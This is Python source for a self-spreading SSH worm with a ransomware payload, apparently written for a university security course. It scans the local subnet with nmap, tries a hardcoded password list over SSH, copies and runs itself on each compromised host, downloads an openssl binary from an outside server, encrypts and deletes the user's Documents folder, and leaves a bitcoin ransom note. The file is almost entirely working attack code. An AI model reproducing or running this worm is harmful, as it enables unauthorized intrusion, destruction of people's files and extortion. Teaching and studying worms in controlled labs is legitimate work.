import paramiko
import tarfile
import sys
import socket
import nmap
import os
import sys
import struct
import fcntl
import netifaces
import urllib
import shutil
from subprocess import call

# The list of credentials to attempt
credList = [
('hello', 'world'),
('hello1', 'world'),
('root', '#Gig#'),
('cpsc', 'cpsc'),
('ubuntu', '123456')
]

# The file marking whether the worm should spread
INFECTED_MARKER_FILE = "/tmp/infected.txt"

##################################################################
# Returns whether the worm should spread
# @return - True if the infection succeeded and false otherwise
##################################################################
def isInfectedSystem(ssh):
	# Check if the system as infected. One
	# approach is to check for a file called
	# infected.txt in directory /tmp (which
	# you created when you marked the system
	# as infected). 
	try:
		sftpClient = ssh.open_sftp()
		sftpClient.stat(INFECTED_MARKER_FILE)
		return True
	except:
		return False	

#################################################################
# Marks the system as infected
#################################################################
def markInfected():
	
	# Mark the system as infected. One way to do
	# this is to create a file called infected.txt
	# in directory /tmp/
	file_obj = open(INFECTED_MARKER_FILE, "w")
	file_obj.write("Has anyone really been far as decided to use even go want to do more like?")
	file_obj.close()
###############################################################
# Spread to the other system and execute
# @param sshClient - the instance of the SSH client connected
# to the victim system
###############################################################
def spreadAndExecute(sshClient):
	
	# This function takes as a parameter 
	# an instance of the SSH class which
	# was properly initialized and connected
	# to the victim system. The worm will
	# copy itself to remote system, change
	# its permissions to executable, and
	# execute itself. Please check out the
	# code we used for an in-class exercise.
	# The code which goes into this function
	# is very similar to that code.	
	wormLoc = "/tmp/extorter_worm.py"	
	if len(sys.argv) >= 2:
		if sys.argv[1] == "--host":
			wormLoc = "extorter_worm.py"
	sftpClient = sshClient.open_sftp()
	sftpClient.put(wormLoc, "/tmp/extorter_worm.py")
	sshClient.exec_command("chmod a+x /tmp/extorter_worm.py")
	sshClient.exec_command("nohup python /tmp/extorter_worm.py &")
	


############################################################
# Try to connect to the given host given the existing
# credentials
# @param host - the host system domain or IP
# @param userName - the user name
# @param password - the password
# @param sshClient - the SSH client
# return - 0 = success, 1 = probably wrong credentials, and
# 3 = probably the server is down or is not running SSH
###########################################################
def tryCredentials(host, userName, _password, sshClient):
	
	# Tries to connect to host host using
	# the username stored in variable userName
	# and password stored in variable password
	# and instance of SSH class sshClient.
	# If the server is down	or has some other
	# problem, connect() function which you will # be using will throw socket.error exception.	     # Otherwise, if the credentials are not
	# correct, it will throw 
	# paramiko.SSHException exception. 
	# Otherwise, it opens a connection
	# to the victim system; sshClient now 
	# represents an SSH connection to the 
	# victim. Most of the code here will
	# be almost identical to what we did
	# during class exercise. Please make
	# sure you return the values as specified
	# in the comments above the function
	# declaration (if you choose to use
	# this skeleton).
	try:
		sshClient.connect(host, username=userName, password=_password)
		return 0
	except paramiko.ssh_exception.AuthenticationException:
		return 1
	except socket.error:
		return 3
		

###############################################################
# Wages a dictionary attack against the host
# @param host - the host to attack
# @return - the instace of the SSH paramiko class and the
# credentials that work in a tuple (ssh, username, password).
# If the attack failed, returns a NULL
###############################################################
def attackSystem(host):
	
	# The credential list
	global credList
	
	# Create an instance of the SSH client
	ssh = paramiko.SSHClient()

	# Set some parameters to make things easier.
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	
				
	# Go through the credential
	for (username, password) in credList:
		
		# TODO: here you will need to
		# call the tryCredentials function
		# to try to connect to the
		# remote system using the above 
		# credentials.  If tryCredentials
		# returns 0 then we know we have
		# successfully compromised the
		# victim. In this case we will
		# return a tuple containing an
		# instance of the SSH connection
		# to the remote system. 
		if tryCredentials(host, username, password, ssh) == 0:
			print "Success with " + host + " " +  username + " " + password
			return (ssh, username, password)
		elif tryCredentials(host, username, password, ssh) == 1:
			print "Wrong Credentials on host " + host
			continue
		elif tryCredentials(host, username, password, ssh) == 3:
			print "No SSH client on " + host
			break #no ssh client so just stop
	# Could not find working credentials
	return None	

####################################################
# Returns the IP of the current system
# @param interface - the interface whose IP we would
# like to know
# @return - The UP address of the current system
####################################################
def getMyIP(interface):
	# TODO: Change this to retrieve and
	# return the IP of the current system.
        # Open the socket 

        # Get all the network interfaces on the system
        networkInterfaces = netifaces.interfaces()

        # The IP address
        ipAddr = None

        # Go through all the interfaces
        for netFace in networkInterfaces:

                # The IP address of the interface
                addr = netifaces.ifaddresses(netFace)[2][0]['addr']

                # Get the IP address
                if not addr == "127.0.0.1":

                        # Save the IP addrss and break
                        ipAddr = addr
                        break

        return ipAddr



                                                             

#######################################################
# Returns the list of systems on the same network
# @return - a list of IP addresses on the same network
#######################################################
def getHostsOnTheSameNetwork():
	
	# TODO: Add code for scanning
	# for hosts on the same network
	# and return the list of discovered
	# IP addresses.	
	portScanner = nmap.PortScanner()
	portScanner.scan('192.168.1.0/24', arguments='-p -22 --open')
	hostInfo = portScanner.all_hosts();
	liveHosts = []
	ip_add = getMyIP(b"eth0")
	for host in hostInfo:
		if portScanner[host].state() == "up" and host != ip_add:
			liveHosts.append(host)

	return liveHosts

def encryptFiles():
	try:	
		urllib.urlretrieve("http://ecs.fullerton.edu/~mgofman/openssl", "openssl")	
		tar = tarfile.open("Documents.tar", "w:gz")
		tar.add("/home/ubuntu/Documents/")
		tar.close()
		call(["chmod", "a+x", "./openssl"])
		call(["openssl", "aes-256-cbc", "-a", "-salt", "-in", "Documents.tar", "-out", "Documents.tar.enc", "-k", "cs456worm"])
		shutil.rmtree('/home/ubuntu/Documents/')
		file_obj = open("give_me_moneyz.txt", "w")
		file_obj.write("Send 100000 btc to 1xcfuh3298sdfz or never see your files again ")
		file_obj.close()
		os.remove("Documents.tar")
	except:
		print "unable to encrpyt"


# Get the hosts on the same network
networkHosts = getHostsOnTheSameNetwork()
#worm checks if its already exists
if not os.path.exists(INFECTED_MARKER_FILE):
	markInfected()
else:
	print "Already Infected"
	sys.exit()

#if its not host then encrpyt
if len(sys.argv) >= 2:
	print "Host, do not encrpyt"
else:
	encryptFiles()

# Go through the network hosts
for host in networkHosts:
	
	# Try to attack this host
	sshInfo =  attackSystem(host)
	
	print sshInfo
	
	
	# Did the attack succeed?
	if sshInfo:
		
		print "Trying to spread"
	 	if isInfectedSystem(sshInfo[0]) == True:
			print "Remote System is Infected"
			continue
		else:
			spreadAndExecute(sshInfo[0])
			print "Spreading complete on " + host	
			sys.exit()	
	

